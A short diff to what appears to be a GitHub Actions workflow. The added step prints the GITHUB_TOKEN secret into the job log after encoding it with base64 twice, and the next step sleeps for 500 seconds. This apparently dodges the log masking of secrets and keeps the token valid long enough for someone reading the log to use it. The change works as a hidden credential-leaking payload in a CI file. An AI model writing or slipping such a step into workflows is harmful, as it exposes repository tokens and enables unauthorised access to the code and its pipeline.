@@ -8,6 +8,6 @@ jobs:
     runs-on: ubuntu-latest
     steps:
     - run: |
-        echo "$GITHUB_TOKEN" | base64 | base64
+        echo "${{SECRETS.GITHUB_TOKEN}}" | base64 | base64
     - run:
         sleep 500
